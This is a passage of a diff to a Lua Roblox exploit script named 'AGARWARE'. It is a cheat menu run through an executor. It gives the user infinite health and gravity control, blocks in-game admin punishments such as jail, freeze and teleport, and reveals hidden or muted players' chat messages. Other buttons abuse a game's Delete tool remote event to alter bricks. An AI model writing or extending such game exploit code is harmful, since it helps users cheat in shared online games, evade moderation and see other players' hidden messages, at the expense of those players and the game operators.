 				end)
-	
-				-- Enforce FPS cap every frame
 				fpsCapLoop = RunService.Heartbeat:Connect(function()
 					pcall(function()
 						setfpscap(fpsCapValue)
 					end)
 				end)
 			else
-				-- Stop loop and reset FPS cap
 				if fpsCapLoop then
 					fpsCapLoop:Disconnect()
 					fpsCapLoop = nil
 				end
-	
-				-- Reset to unlimited FPS
 				pcall(function()
 					setfpscap(999)
 				end)
 			end
 		end
 	})
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	-- ====================================================================================================
-	-- GRAVITY
-	-- ====================================================================================================
 	local DEFAULT_GRAVITY = 196.2
 	local gravityValue = 196.2
 	local gravityEnabled = false
-	
 	local function getGravity(text)
 		local lowerText = string.lower(text)
 		if lowerText == "inf" or lowerText == "infinity" then 
@@ -9599,7 +8990,6 @@ local script = AGARWARE["22c"];
 		if num == 0 then return 0 end
 		return num and num > 0 and num or DEFAULT_GRAVITY
 	end
-	
 	_G.CreateTextbox({
 		frame = "SetGravity",
 		textboxname = "GravityChanger",
@@ -9608,21 +8998,17 @@ local script = AGARWARE["22c"];
 		hovercolor = true,
 		callback = function(text)
 			gravityValue = getGravity(text)
-	
-			-- Only apply if gravity is enabled
 			if gravityEnabled then
 				workspace.Gravity = gravityValue
 			end
 		end
 	})
-	
 	_G.CreateToggle({
 		frame = "SetGravity",
 		groupbox = script,
 		tooltip = "Changes workspace gravity. Use the textbox to adjust value.",
 		callback = function(isEnabled)
 			gravityEnabled = isEnabled
-	
 			if isEnabled then
 				workspace.Gravity = gravityValue
 			else
@@ -9630,62 +9016,35 @@ local script = AGARWARE["22c"];
 			end
 		end
 	})
-	
-	-- Reapply on character respawn
 	local Players = game:GetService("Players")
 	local LocalPlayer = Players.LocalPlayer
-	
 	LocalPlayer.CharacterAdded:Connect(function(character)
 		character:WaitForChild("Humanoid")
 		if gravityEnabled then
 			workspace.Gravity = gravityValue
 		end
 	end)
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	-- ====================================================================================================
-	-- INF HEALTH
-	-- ====================================================================================================
 	local Players = game:GetService("Players")
 	local RunService = game:GetService("RunService")
 	local LocalPlayer = Players.LocalPlayer
-	
 	local godConnections = {}
-	
 	local function enableGodMode()
-		-- Disconnect old connections
 		for _, conn in pairs(godConnections) do
 			if conn then conn:Disconnect() end
 		end
 		godConnections = {}
-	
 		local character = LocalPlayer.Character
 		if not character then return end
-	
 		local humanoid = character:FindFirstChildOfClass("Humanoid")
 		if not humanoid then return end
-	
 		humanoid.MaxHealth = math.huge
 		humanoid.Health = math.huge
-	
-		-- Connection 1: RenderStepped loop
 		table.insert(godConnections, RunService.RenderStepped:Connect(function()
 			if humanoid and humanoid.Parent then
 				humanoid.MaxHealth = math.huge
 				humanoid.Health = math.huge
 			end
 		end))
-	
-		-- Connection 2: Health changed listener
 		table.insert(godConnections, humanoid:GetPropertyChangedSignal("Health"):Connect(function()
 			if humanoid and humanoid.Parent then
 				if humanoid.Health < math.huge then
@@ -9694,8 +9053,6 @@ local script = AGARWARE["22c"];
 				end
 			end
 		end))
-	
-		-- Connection 3: Death listener
 		table.insert(godConnections, humanoid.Died:Connect(function()
 			task.wait()
 			if humanoid and humanoid.Parent then
@@ -9703,15 +9060,11 @@ local script = AGARWARE["22c"];
 			end
 		end))
 	end
-	
 	local function disableGodMode()
-		-- Disconnect all connections
 		for _, conn in pairs(godConnections) do
 			if conn then conn:Disconnect() end
 		end
 		godConnections = {}
-	
-		-- Reset health
 		task.wait()
 		local character = LocalPlayer.Character
 		if character then
@@ -9723,7 +9076,6 @@ local script = AGARWARE["22c"];
 			end
 		end
 	end
-	
 	_G.CreateToggle({
 		frame = "InfHealth",
 		groupbox = script,
@@ -9731,8 +9083,6 @@ local script = AGARWARE["22c"];
 		callback = function(isEnabled)
 			if isEnabled then
 				enableGodMode()
-	
-				-- Reconnect on respawn
 				_G.GodModeRespawn = LocalPlayer.CharacterAdded:Connect(function(character)
 					task.wait(0.5)
 					if _G.ConfigData["InfHealth"] then
@@ -9741,8 +9091,6 @@ local script = AGARWARE["22c"];
 				end)
 			else
 				disableGodMode()
-	
-				-- Disconnect respawn connection
 				if _G.GodModeRespawn then
 					_G.GodModeRespawn:Disconnect()
 					_G.GodModeRespawn = nil
@@ -9750,21 +9098,10 @@ local script = AGARWARE["22c"];
 			end
 		end
 	})
-	
-	
-	
-	
-	
-	
-	-- ====================================================================================================
-	-- RESPAWN AT DEATH
-	-- ====================================================================================================
 	local Players = game:GetService("Players")
 	local LocalPlayer = Players.LocalPlayer
-	
 	local respawnEnabled = false
 	local respawnConnection = nil
-	
 	_G.CreateToggle({
 		frame = "RespawnAtDeath",
 		groupbox = script,
@@ -9807,7 +9144,6 @@ task.spawn(C_22c);
 local function C_27d()
 local script = AGARWARE["27d"];
 	repeat task.wait() until _G.CreateToggle and _G.CreateButton and _G.CreateButtonToggle and _G.CreateTextbox and _G.CreateSlider and _G.CreateDropdown
-	
 	local groupbox = script.Parent
 	local uiListLayout = groupbox:FindFirstChildOfClass("UIListLayout")
 	local function getScreenGui()
@@ -9834,12 +9170,6 @@ local script = AGARWARE["27d"];
 		end
 		updateSize()
 	end
-	
-	
-	
-	-- ====================================================================================================
-	-- GROUPBOX/TAB CONFIGS
-	-- ====================================================================================================
 	_G.CreateButton({
 		frame = "FixCam",
 		groupbox = script,
@@ -9855,17 +9185,9 @@ local script = AGARWARE["27d"];
 			if head then head.Anchored = false end
 		end,
 	})
-	
-	
-	
-	
-	-- ====================================================================================================
-	-- MAX ZOOM
-	-- ====================================================================================================
 	local maxZoomValue = 400
 	local maxZoomEnabled = false
 	local maxZoomLoop = nil
-	
 	_G.CreateToggle({
 		frame = "MaxZoom",
 		groupbox = script,
@@ -9906,15 +9228,9 @@ local script = AGARWARE["27d"];
 			end
 		end
 	})
-	
-	
-	
-	
-	
 	local minZoomValue = 0.5
 	local minZoomEnabled = false
 	local minZoomLoop = nil
-	
 	_G.CreateToggle({
 		frame = "MinZoom",
 		groupbox = script,
@@ -9982,27 +9298,17 @@ local script = AGARWARE["2bf"];
 		end
 		updateSize()
 	end
-	
-	-- ====================================================================================================
-	-- GROUPBOX/TAB CONFIGS
-	-- ====================================================================================================
-	
 	_G.CreateToggle({
 		frame = "visual",
 		groupbox = script,
 		tooltip = "Hides all main visual effects which includes: blind, colorless, fog, and myopic.",
 		callback = function(isEnabled)
 			if isEnabled then
-				-- Start the anti visual loop
 				_G.AntiVisualLoop = game:GetService("RunService").Heartbeat:Connect(function()
 					local Lighting = game:GetService("Lighting")
 					local LocalPlayer = game:GetService("Players").LocalPlayer
-	
-					-- Anti Myopic
 					local blur = Lighting:FindFirstChild("Blur")
 					if blur then blur.Enabled = false end
-	
-					-- Anti Blind
 					local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
 					if playerGui then
 						local blind = playerGui:FindFirstChild("Blind")
@@ -10013,17 +9319,12 @@ local script = AGARWARE["2bf"];
 							end
 						end
 					end
-	
-					-- Anti Fog
 					local fog = Lighting:FindFirstChild("Fog")
 					if fog then fog.Density = 0 end
-	
-					-- Anti Colorless
 					local rgb = Lighting:FindFirstChild("RGB")
 					if rgb then rgb.Enabled = false end
 				end)
 			else
-				-- Stop the loop when disabled
 				if _G.AntiVisualLoop then
 					_G.AntiVisualLoop:Disconnect()
 					_G.AntiVisualLoop = nil
@@ -10031,13 +9332,6 @@ local script = AGARWARE["2bf"];
 			end
 		end
 	})
-	
-	
-	
-	
-	-- ====================================================================================================
-	-- VAMP
-	-- ====================================================================================================
 	_G.CreateToggle({
 		frame = "vampire",
 		groupbox = script,
@@ -10047,20 +9341,13 @@ local script = AGARWARE["2bf"];
 				local LocalPlayer = game:GetService("Players").LocalPlayer
 				local StarterGui = game:GetService("StarterGui")
 				local RunService = game:GetService("RunService")
-	
-				-- Store active loops
 				_G.AntiVampLoops = _G.AntiVampLoops or {}
-	
-				-- Function to run anti-vamp for 5 seconds after respawn
 				local function onCharacterAdded(character)
 					local humanoid = character:WaitForChild("Humanoid")
-	
-					-- Run anti-vamp loop for 5 seconds
 					local startTime = tick()
 					local tempLoop
 					tempLoop = RunService.Heartbeat:Connect(function()
 						if tick() - startTime >= 5 then
-							-- Stop after 5 seconds and remove from table
 							if tempLoop then
 								tempLoop:Disconnect()
 								tempLoop = nil
@@ -10073,7 +9360,6 @@ local script = AGARWARE["2bf"];
 							end
 							return
 						end
-	
 						if humanoid and humanoid.Health > 0 then
 							pcall(function()
 								StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
@@ -10082,26 +9368,17 @@ local script = AGARWARE["2bf"];
 							workspace.CurrentCamera.CameraSubject = humanoid
 						end
 					end)
-	
-					-- Add to active loops table
 					table.insert(_G.AntiVampLoops, tempLoop)
 				end
-	
-				-- Connect to character respawn
 				_G.AntiVampConnection = LocalPlayer.CharacterAdded:Connect(onCharacterAdded)
-	
-				-- Also run for current character if it exists
 				if LocalPlayer.Character then
 					onCharacterAdded(LocalPlayer.Character)
 				end
 			else
-				-- Disconnect character respawn connection
 				if _G.AntiVampConnection then
 					_G.AntiVampConnection:Disconnect()
 					_G.AntiVampConnection = nil
 				end
-	
-				-- Disconnect all active heartbeat loops
 				if _G.AntiVampLoops then
 					for _, loop in pairs(_G.AntiVampLoops) do
 						pcall(function()
@@ -10115,15 +9392,6 @@ local script = AGARWARE["2bf"];
 			end
 		end
 	})
-	
-	
-	
-	
-	
-	
-	-- ====================================================================================================
-	-- GLITCH
-	-- ====================================================================================================
 	_G.CreateToggle({
 		frame = "glitch",
 		groupbox = script,
@@ -10135,37 +9403,29 @@ local script = AGARWARE["2bf"];
 				local lastPosition = nil
 				local lastOrientation = nil
 				local hasTeleportedBack = false
-	
 				_G.AntiGlitchLoop = RunService.Heartbeat:Connect(function()
 					local character = LocalPlayer.Character
 					if not character then return end
 					local root = character:FindFirstChild("HumanoidRootPart")
 					if not root then return end
-	
 					if not lastPosition then
 						lastPosition = root.Position
 						lastOrientation = root.CFrame - root.Position
 						hasTeleportedBack = false
 						return
 					end
-	
 					local currentPos = root.Position
-	
-					-- Check if X coordinate is 1234567 (glitch zone)
 					if math.abs(currentPos.X - 1234567) < 5 and not hasTeleportedBack then
-						-- Teleported to the glitch zone, send back with same rotation
 						root.CFrame = CFrame.new(lastPosition) * lastOrientation
 						hasTeleportedBack = true
 						_G.Notify("Blocked glitch command!", 2)
 					elseif math.abs(currentPos.X - 1234567) >= 5 then
-						-- Not in the glitch zone anymore, reset flag and update position
 						hasTeleportedBack = false
 						lastPosition = currentPos
 						lastOrientation = root.CFrame - root.Position
 					end
 				end)
 			else
-				-- Stop the loop when disabled
 				if _G.AntiGlitchLoop then
 					_G.AntiGlitchLoop:Disconnect()
 					_G.AntiGlitchLoop = nil
@@ -10173,10 +9433,6 @@ local script = AGARWARE["2bf"];
 			end
 		end
 	})
-	
-	-- ====================================================================================================
-	-- JAIL
-	-- ====================================================================================================
 	_G.CreateToggle({
 		frame = "jail",
 		groupbox = script,
@@ -10186,23 +9442,18 @@ local script = AGARWARE["2bf"];
 				local LocalPlayer = game:GetService("Players").LocalPlayer
 				local RunService = game:GetService("RunService")
 				local hasNotified = false
-	
 				_G.AntiJailLoop = RunService.Heartbeat:Connect(function()
 					local char = workspace:FindFirstChild(LocalPlayer.Name)
 					if not char then return end
-	
 					local jail = char:FindFirstChild("Jail")
 					if not jail then 
 						hasNotified = false
 						return 
 					end
-	
-					-- Notify once when jail is detected
 					if not hasNotified then
 						_G.Notify("Blocked jail command!", 2)
 						hasNotified = true
 					end
-	
 					for _, part in pairs(jail:GetChildren()) do
 						if part:IsA("BasePart") and part.Name == "Part" then
 							part.CanCollide = false
@@ -10211,7 +9462,6 @@ local script = AGARWARE["2bf"];
 					end
 				end)
 			else
-				-- Stop the loop when disabled
 				if _G.AntiJailLoop then
 					_G.AntiJailLoop:Disconnect()
 					_G.AntiJailLoop = nil
@@ -10219,10 +9469,6 @@ local script = AGARWARE["2bf"];
 			end
 		end
 	})
-	
-	-- ====================================================================================================
-	-- MAPTIDE NAN
-	-- ====================================================================================================
 	_G.CreateToggle({
 		frame = "maptidenan",
 		groupbox = script,
@@ -10230,14 +9476,12 @@ local script = AGARWARE["2bf"];
 		callback = function(isEnabled)
 			if isEnabled then
 				local LocalPlayer = game:GetService("Players").LocalPlayer
-	
 				local function isVoided()
 					local spawn = workspace:FindFirstChild("Spawn")
 					if not spawn then return false end
 					local acm = spawn.AssemblyCenterOfMass
 					return acm.X == 0 and acm.Y == -1000000 and acm.Z == 0
 				end
-	
 				local function onCharacterAdded(character)
 					local hrp = character:WaitForChild("HumanoidRootPart")
 					if not isVoided() then return end
@@ -10245,20 +9489,13 @@ local script = AGARWARE["2bf"];
 					task.wait(0.1)
 					hrp.CFrame = CFrame.new(0, 3, 0)
 					hrp.Anchored = false
-	
-					-- Notify when teleported
 					_G.Notify("Blocked NaN spawn kill!", 2)
 				end
-	
-				-- Connect to character respawn
 				_G.AntiNanConnection = LocalPlayer.CharacterAdded:Connect(onCharacterAdded)
-	
-				-- Also run for current character if it exists
 				if LocalPlayer.Character then
 					onCharacterAdded(LocalPlayer.Character)
 				end
 			else
-				-- Disconnect when disabled
 				if _G.AntiNanConnection then
 					_G.AntiNanConnection:Disconnect()
 					_G.AntiNanConnection = nil
@@ -10266,10 +9503,6 @@ local script = AGARWARE["2bf"];
 			end
 		end
 	})
-	
-	-- ====================================================================================================
-	-- FREEZE
-	-- ====================================================================================================
 	_G.CreateToggle({
 		frame = "freeze",
 		groupbox = script,
@@ -10279,29 +9512,23 @@ local script = AGARWARE["2bf"];
 				local LocalPlayer = game:GetService("Players").LocalPlayer
 				local RunService = game:GetService("RunService")
 				local isResetting = false
-	
 				_G.AntiFreezeLoop = RunService.Heartbeat:Connect(function()
 					local char = workspace:FindFirstChild(LocalPlayer.Name)
 					if not char then return end
-	
 					if char:FindFirstChild("Hielo") and not isResetting then
 						isResetting = true
 						_G.Notify("Frozen detected! Resetting...", 2)
-	
 						if shared.ResetCharacter then
 							shared.ResetCharacter()
 						else
-							-- Fallback reset method
 							LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Health = 0
 						end
-	
 						LocalPlayer.CharacterAdded:Wait()
 						task.wait(0.2)
 						isResetting = false
 					end
 				end)
 			else
-				-- Stop the loop when disabled
 				if _G.AntiFreezeLoop then
 					_G.AntiFreezeLoop:Disconnect()
 					_G.AntiFreezeLoop = nil
@@ -10309,10 +9536,6 @@ local script = AGARWARE["2bf"];
 			end
 		end
 	})
-	
-	-- ====================================================================================================
-	-- INVIS
-	-- ====================================================================================================
 	_G.CreateToggle({
 		frame = "invisible",
 		groupbox = script,
@@ -10322,30 +9545,24 @@ local script = AGARWARE["2bf"];
 				local LocalPlayer = game:GetService("Players").LocalPlayer
 				local RunService = game:GetService("RunService")
 				local isResetting = false
-	
 				_G.AntiInvisLoop = RunService.Heartbeat:Connect(function()
 					local char = workspace:FindFirstChild(LocalPlayer.Name)
 					if not char then return end
-	
 					local upperTorso = char:FindFirstChild("UpperTorso")
 					if upperTorso and upperTorso.Transparency >= 1 and not isResetting then
 						isResetting = true
 						_G.Notify("Invisible detected! Resetting...", 2)
-	
 						if shared.ResetCharacter then
 							shared.ResetCharacter()
 						else
-							-- Fallback reset method
 							LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Health = 0
 						end
-	
 						LocalPlayer.CharacterAdded:Wait()
 						task.wait(0.2)
 						isResetting = false
 					end
 				end)
 			else
-				-- Stop the loop when disabled
 				if _G.AntiInvisLoop then
 					_G.AntiInvisLoop:Disconnect()
 					_G.AntiInvisLoop = nil
@@ -10353,11 +9570,6 @@ local script = AGARWARE["2bf"];
 			end
 		end
 	})
-	
-	
-	-- ====================================================================================================
-	-- MORPH
-	-- ====================================================================================================
 	_G.CreateToggle({
 		frame = "morph",
 		groupbox = script,
@@ -10370,15 +9582,11 @@ local script = AGARWARE["2bf"];
 				local originalShirt = nil
 				local originalPants = nil
 				local originalAccessories = {}
-	
 				local function captureOriginalAppearance(character)
-					-- Capture shirt
 					local shirt = character:FindFirstChildOfClass("Shirt")
 					originalShirt = shirt and shirt.ShirtTemplate or nil
-					-- Capture pants
 					local pants = character:FindFirstChildOfClass("Pants")
 					originalPants = pants and pants.PantsTemplate or nil
-					-- Capture accessories
 					originalAccessories = {}
 					for _, accessory in pairs(character:GetChildren()) do
 						if accessory:IsA("Accessory") then
@@ -10386,29 +9594,24 @@ local script = AGARWARE["2bf"];
 						end
 					end
 				end
-	
 				local function checkForMorph(character)
 					if isResetting or not canDetect then return end
-					-- Check shirt change
 					local shirt = character:FindFirstChildOfClass("Shirt")
 					local currentShirt = shirt and shirt.ShirtTemplate or nil
 					if currentShirt ~= originalShirt then
 						return true
 					end
-					-- Check pants change
 					local pants = character:FindFirstChildOfClass("Pants")
 					local currentPants = pants and pants.PantsTemplate or nil
 					if currentPants ~= originalPants then
 						return true
 					end
-					-- Check accessories change
 					local currentAccessories = {}
 					for _, accessory in pairs(character:GetChildren()) do
 						if accessory:IsA("Accessory") then
 							table.insert(currentAccessories, accessory.Name)
 						end
 					end
-					-- Compare accessories (if count or names changed)
 					if #currentAccessories ~= #originalAccessories then
 						return true
 					end
@@ -10426,24 +9629,19 @@ local script = AGARWARE["2bf"];
 					end
 					return false
 				end
-	
 				local function onCharacterAdded(character)
-					canDetect = false -- Disable detection on respawn
-					task.wait(0.5) -- Wait for character to fully load
+					canDetect = false 
+					task.wait(0.5) 
 					captureOriginalAppearance(character)
-					task.wait(1) -- Wait 1 second before enabling detection
+					task.wait(1) 
 					canDetect = true
 					isResetting = false
 				end
-	
-				-- Capture initial appearance
 				if LocalPlayer.Character then
 					task.spawn(function()
 						onCharacterAdded(LocalPlayer.Character)
 					end)
 				end
-	
-				-- Monitor for changes
 				_G.AntiMorphLoop = game:GetService("RunService").Heartbeat:Connect(function()
 					local char = workspace:FindFirstChild(LocalPlayer.Name)
 					if not char then return end
@@ -10459,11 +9657,8 @@ local script = AGARWARE["2bf"];
 						task.wait(0.2)
 					end
 				end)
-	
-				-- Track respawns
 				_G.AntiMorphRespawn = LocalPlayer.CharacterAdded:Connect(onCharacterAdded)
 			else
-				-- Stop the loop when disabled
 				if _G.AntiMorphLoop then
 					_G.AntiMorphLoop:Disconnect()
 					_G.AntiMorphLoop = nil
@@ -10475,11 +9670,6 @@ local script = AGARWARE["2bf"];
 			end
 		end
 	})
-	
-	
-	-- ====================================================================================================
-	-- NOCLIP
-	-- ====================================================================================================
 	_G.CreateToggle({
 		frame = "noclip",
 		groupbox = script,
@@ -10489,7 +9679,6 @@ local script = AGARWARE["2bf"];
 				local LocalPlayer = game:GetService("Players").LocalPlayer
 				local TeleportService = game:GetService("TeleportService")
 				local hasDetected = false
-	
 				_G.AntiNoclipLoop = task.spawn(function()
 					while true do
 						local char = workspace:FindFirstChild(LocalPlayer.Name)
@@ -10505,7 +9694,6 @@ local script = AGARWARE["2bf"];
 					end
 				end)
 			else
-				-- Stop the loop when disabled
 				if _G.AntiNoclipLoop then
 					task.cancel(_G.AntiNoclipLoop)
 					_G.AntiNoclipLoop = nil
@@ -10513,14 +9701,6 @@ local script = AGARWARE["2bf"];
 			end
 		end
 	})
-	
-	
-	
-	
-	
-	-- ====================================================================================================
-	-- TP
-	-- ====================================================================================================
 	_G.CreateToggle({
 		frame = "teleport",
 		groupbox = script,
@@ -10531,27 +9711,22 @@ local script = AGARWARE["2bf"];
 				local RunService = game:GetService("RunService")
 				local lastPosition = nil
 				local lastOrientation = nil
-	
 				_G.AntiTeleportLoop = RunService.Heartbeat:Connect(function()
 					local character = LocalPlayer.Character
 					if not character then return end
 					local root = character:FindFirstChild("HumanoidRootPart")
 					if not root then return end
-	
 					if lastPosition then
 						local distance = (root.Position - lastPosition).Magnitude
 						if distance > 15 then
-							-- Teleported, send back with same rotation
 							root.CFrame = CFrame.new(lastPosition) * lastOrientation
 							_G.Notify("Blocked teleport!", 2)
 						end
 					end
-	
 					lastPosition = root.Position
 					lastOrientation = root.CFrame - root.Position
 				end)
 			else
-				-- Stop the loop when disabled
 				if _G.AntiTeleportLoop then
 					_G.AntiTeleportLoop:Disconnect()
 					_G.AntiTeleportLoop = nil
@@ -10590,17 +9765,12 @@ local script = AGARWARE["352"];
 		end
 		updateSize()
 	end
-	
-	-- ====================================================================================================
-	-- SPYCHAT SETUP
-	-- ====================================================================================================
 	local TCO_PLACE_IDS = {
 		11137575513,
 		12943245078,
 		12943247001,
 		108097274488844,
 	}
-	
 	local isTCO = false
 	for _, id in ipairs(TCO_PLACE_IDS) do
 		if game.PlaceId == id then
@@ -10608,10 +9778,8 @@ local script = AGARWARE["352"];
 			break
 		end
 	end
-	
 	if isTCO then
 		local isog = workspace:FindFirstChild("Cubes") ~= nil
-	
 		local namecolors = {
 			peasant  = {150, 103, 102},
 			arken    = {4,   175, 236},
@@ -10623,17 +9791,13 @@ local script = AGARWARE["352"];
 		if isog then
 			namecolors.peasant = {128, 128, 128}
 		end
-	
 		local namecolorshex = {}
 		for i, v in pairs(namecolors) do
 			namecolorshex[i] = "#" .. Color3.fromRGB(table.unpack(v)):ToHex()
 		end
-	
-		-- Register handler
 		_G.ChatHandlers = _G.ChatHandlers or {}
 		table.insert(_G.ChatHandlers, function(mdata, plr)
 			local spyChatOn = _G.ConfigData and _G.ConfigData["spychat"] or false
-	
 			local cn
 			if plr.Neutral == true then
 				if plr:GetAttribute("Arken") == true then
@@ -10644,7 +9808,6 @@ local script = AGARWARE["352"];
 			else
 				cn = "admin"
 			end
-	
 			local muted = plr:HasTag("Muted")
 			if muted then
 				cn = "hidden"
@@ -10652,7 +9815,6 @@ local script = AGARWARE["352"];
 					mdata.Text = ""
 				end
 			end
-	
 			local hidden = false
 			if string.sub(mdata.Text, 1, 1) == ";" then
 				if spyChatOn then
@@ -10662,7 +9824,6 @@ local script = AGARWARE["352"];
 					mdata.Text = ""
 				end
 			end
-	
 			local iqEmoji = nil
 			if spyChatOn and plr:GetAttribute("IQ") then
 				local iq = plr:GetAttribute("IQ")
@@ -10674,7 +9835,6 @@ local script = AGARWARE["352"];
 					cn = "iqdumb"
 				end
 			end
-	
 			local icon = ""
 			if spyChatOn then
 				if hidden then
@@ -10685,13 +9845,11 @@ local script = AGARWARE["352"];
 					icon = iqEmoji .. " "
 				end
 			end
-	
 			local r   = namecolors[cn][1]
 			local g   = namecolors[cn][2]
 			local b   = namecolors[cn][3]
 			local hex = namecolorshex[cn]
 			local displayName = plr.DisplayName
-	
 			if isog then
 				mdata.PrefixText = "<font color=\"" .. hex .. "\"><b><font color='rgb(" .. r .. "," .. g .. "," .. b .. ")'>" .. icon .. "[" .. displayName .. "]: </font></b></font>"
 			else
@@ -10699,10 +9857,6 @@ local script = AGARWARE["352"];
 			end
 		end)
 	end
-	
-	-- ====================================================================================================
-	-- GROUPBOX/TAB CONFIGS
-	-- ====================================================================================================
 	_G.CreateToggle({
 		frame = "spychat",
 		groupbox = script,
@@ -10710,10 +9864,6 @@ local script = AGARWARE["352"];
 		callback = function(isEnabled)
 		end
 	})
-	
-	
-	
-	
 	local Players = game:GetService("Players")
 	local LocalPlayer = Players.LocalPlayer
 	local pickupLoop = nil
@@ -10727,7 +9877,6 @@ local script = AGARWARE["352"];
 		callback = function(isEnabled)
 			if isEnabled then
 				autoPickedTools = {}
-				-- Pickup loop
 				pickupLoop = task.spawn(function()
 					while true do
 						local char = LocalPlayer.Character
@@ -10741,8 +9890,6 @@ local script = AGARWARE["352"];
 									pcall(function()
 										hum:EquipTool(obj)
 									end)
-	
-									-- Notify when tool is grabbed
 									_G.Notify("Auto grabbed tool: " .. toolName, 2)
 								end
 							end
@@ -10754,7 +9901,6 @@ local script = AGARWARE["352"];
 						task.wait()
 					end
 				end)
-				-- Unequip loop
 				unequipLoop = task.spawn(function()
 					while true do
 						local char = LocalPlayer.Character
@@ -10775,7 +9921,6 @@ local script = AGARWARE["352"];
 					end
 				end)
 			else
-				-- Disable
 				if pickupLoop then
 					task.cancel(pickupLoop)
 					pickupLoop = nil
@@ -10788,11 +9933,6 @@ local script = AGARWARE["352"];
 			end
 		end
 	})
-	
-	
-	-- ====================================================================================================
-	-- BUTTONS
-	-- ====================================================================================================
 	_G.CreateButton({
 		frame = "disabledeletesound",
 		groupbox = script,
@@ -10813,16 +9953,12 @@ local script = AGARWARE["352"];
 				end
 				local character = LocalPlayer.Character
 				if not character then error("No character") end
-	
-				-- Refresh the delete tool first
 				if shared.RefreshTool then
 					shared.RefreshTool("Delete")
 					task.wait(0.1)
 				end
-	
 				local deleteTool = LocalPlayer.Backpack:FindFirstChild("Delete") or character:FindFirstChild("Delete")
 				if not deleteTool then error("Delete tool needed!") end
-	
 				local event = deleteTool:WaitForChild("Script"):WaitForChild("Event")
 				local hrp = character:FindFirstChild("HumanoidRootPart")
 				if not hrp then error("No HumanoidRootPart") end
@@ -10844,9 +9980,6 @@ local script = AGARWARE["352"];
 			end
 		end,
 	})
-	-- ====================================================================================================
-	-- DISABLE BKIT
-	-- ====================================================================================================
 	_G.CreateButton({
 		frame = "disablebkit",
 		groupbox = script,
@@ -10866,16 +9999,12 @@ local script = AGARWARE["352"];
 				local rs = game:GetService("ReplicatedStorage")
 				local character = LocalPlayer.Character
 				if not character then error("No character") end
-	
-				-- Refresh the delete tool first
 				if shared.RefreshTool then
 					shared.RefreshTool("Delete")
 					task.wait(0.1)
 				end
-	
 				local deleteTool = LocalPlayer.Backpack:FindFirstChild("Delete") or character:FindFirstChild("Delete")
 				if not deleteTool then error("Delete tool needed!") end
-	
 				local event = deleteTool:WaitForChild("Script"):WaitForChild("Event")
 				local brick = rs:FindFirstChild("Brick")
 				if not brick then error("No Brick in ReplicatedStorage") end
@@ -10901,10 +10030,6 @@ local script = AGARWARE["352"];
 			end
 		end,
 	})
-	
-	-- ====================================================================================================
-	-- FIX BRICK
-	-- ====================================================================================================
 	_G.CreateButton({
 		frame = "fixbrick",
 		groupbox = script,
@@ -10970,23 +10095,16 @@ local script = AGARWARE["352"];
 			end
 		end,
 	})
-	
-	-- ====================================================================================================
-	-- RESTORE BRICK
-	-- ====================================================================================================
 	if getgenv().brickcollection == nil then
 		getgenv().brickcollection = {}
-	
 		local brickname = "Brick"
 		local cfolder = workspace:FindFirstChild("Bricks") or workspace:FindFirstChild("Blocks")
-	
 		local function dbc(b)
 			if b.Name ~= brickname then return end
 			if not table.find(getgenv().brickcollection, b) then
 				table.insert(getgenv().brickcollection, 1, b)
 			end
 		end
-	
 		if cfolder then
 			cfolder.DescendantAdded:Connect(dbc)
 			for _, v in pairs(cfolder:GetDescendants()) do
@@ -10994,7 +10112,6 @@ local script = AGARWARE["352"];
 			end
 		end
 	end
-	
 	_G.CreateButton({
 		frame = "restorebrick",
 		groupbox = script,
@@ -11005,35 +10122,27 @@ local script = AGARWARE["352"];
 		canClickDuringAfter = true,
 		callback = function()
 			local token = _G.SetButtonText("restorebrick", "Processing...", 999)
-	
 			if getgenv().brickcollection == nil then
 				getgenv().brickcollection = {}
 			end
-	
 			local success, result = pcall(function()
 				local Players = game:GetService("Players")
 				local LocalPlayer = Players.LocalPlayer
 				local rs = game:GetService("ReplicatedStorage")
 				local workspace = game:GetService("Workspace")
-	
 				local brickname = "Brick"
 				local ws = 0.235
 				local cfolder = workspace:FindFirstChild("Bricks") or workspace:FindFirstChild("Blocks")
-	
 				if not cfolder then
 					return "No blocks folder!"
 				end
-	
 				local character = LocalPlayer.Character
 				if not character then return "No character!" end
-	
 				local hrp = character:FindFirstChild("HumanoidRootPart")
 				if not hrp then return "No HumanoidRootPart!" end
-	
 				local function getplrpos()
 					return hrp.Position
 				end
-	
 				local function findtool(toolname)
 					for _, v in pairs(character:GetChildren()) do
 						if v:IsA("Tool") and v.Name:find(toolname) then
@@ -11047,35 +10156,29 @@ local script = AGARWARE["352"];
 					end
 					return nil
 				end
-	
 				if not rs:FindFirstChild(brickname) then
 					local brick = Instance.new("Part")
 					brick.Name = brickname
 					brick.Parent = rs
 				end
-	
 				for _, v in pairs(character:GetChildren()) do
 					if v:HasTag("The Chosen One by TomazDev") then
 						v.Script.Enabled = false
 						v.Script.Enabled = true
 					end
 				end
-	
 				for _, v in pairs(LocalPlayer.Backpack:GetChildren()) do
 					if v:HasTag("The Chosen One by TomazDev") then
 						v.Script.Enabled = false
 						v.Script.Enabled = true
 					end
 				end
-	
 				local buildtool = findtool("Build")
 				local painttool = findtool("Paint")
 				local shapetool = findtool("Shape")
-	
 				if not buildtool then
 					return "Build tool needed!"
 				end
-	
 				if buildtool.Parent == LocalPlayer.Backpack then
 					buildtool.Parent = character
 				end
@@ -11085,9 +10188,7 @@ local script = AGARWARE["352"];
 				if shapetool and shapetool.Parent == LocalPlayer.Backpack then
 					shapetool.Parent = character
 				end
-	
 				task.wait(ws)
-	
 				local currbc = {}
 				for _, v in pairs(getgenv().brickcollection) do
 					if v ~= nil and typeof(v) == "Instance" then
@@ -11098,19 +10199,15 @@ local script = AGARWARE["352"];
 						end
 					end
 				end
-	
 				if #currbc == 0 then
 					return "No blocks found!"
 				end
-	
 				local playerfolder = cfolder:FindFirstChild(LocalPlayer.Name)
 				if not playerfolder then
 					return "Player folder not found!"
 				end
-	
 				local block = nil
 				local beforeamt = #playerfolder:GetChildren()
-	
 				for _, v in pairs(currbc) do
 					if v ~= nil and typeof(v) == "Instance" then
 						block = v
@@ -11122,23 +10219,18 @@ local script = AGARWARE["352"];
 								"detailed"
 							)
 						end
-	
 						task.wait(ws)
 						if beforeamt < #playerfolder:GetChildren() then
 							break
 						end
 					end
 				end
-	
 				task.wait(1)
 				block = playerfolder:FindFirstChildWhichIsA("BasePart")
-	
 				if not block then
